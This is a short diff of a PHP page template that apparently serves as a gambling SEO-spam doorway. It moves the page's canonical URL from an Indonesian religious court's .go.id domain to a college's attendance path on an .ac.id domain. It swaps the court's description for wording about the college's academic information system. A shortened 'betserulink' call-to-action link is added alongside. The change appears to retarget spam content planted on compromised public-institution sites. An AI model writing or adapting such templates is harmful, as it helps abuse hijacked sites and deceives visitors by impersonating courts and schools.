@@ -33,14 +33,14 @@ if (!$found) {
     show404();
 }
 $amphtml = "https://tamuramah.club/id/$dashbrand";
-$canonical = "https://js.pa-wangiwangi.go.id/$dashbrand";
+$canonical = "https://absen.stkiprosaliametro.ac.id/absen/$dashbrand";
 $cta = "https://t.ly/betserulink";
-$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1730384127/OIG3.wKnO20xVUG4ABXE.F0Er_zcc01m.jpg";
+$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1730384127/OIG3.Wg9OhK3IPyoteJ.pO9Fj_tvxosw.jpg";
 $price = "5000.00";
 
-$judul = "$namabrand Jadwal Pengadilan Agama Wangi-Wangi";
-$desc = "$namabrand adalah institusi yang melayani penyelesaian perkara perdata khususnya yang berhubungan dengan hukum keluarga Islam, seperti perceraian, hak asuh anak, harta bersama, hingga perkara waris.";
-$konten = "$namabrand adalah institusi yang melayani penyelesaian perkara perdata khususnya yang berhubungan dengan hukum keluarga Islam, seperti perceraian, hak asuh anak, harta bersama, hingga perkara waris.";
+$judul = "$namabrand Sistem Informasi Akademik STKIP Rosalia";
+$desc = "$namabrand merupakan salah satu alat penting dalam mengelola data dan informasi yang berkaitan dengan kegiatan akademik. Dengan kemajuan teknologi, SIA membantu meningkatkan efisiensi administrasi, mempermudah akses informasi, serta meningkatkan pengalaman belajar bagi mahasiswa.";
+$konten = "$namabrand merupakan salah satu alat penting dalam mengelola data dan informasi yang berkaitan dengan kegiatan akademik. Dengan kemajuan teknologi, SIA membantu meningkatkan efisiensi administrasi, mempermudah akses informasi, serta meningkatkan pengalaman belajar bagi mahasiswa.";
 ?>
 
 <!DOCTYPE HTML>
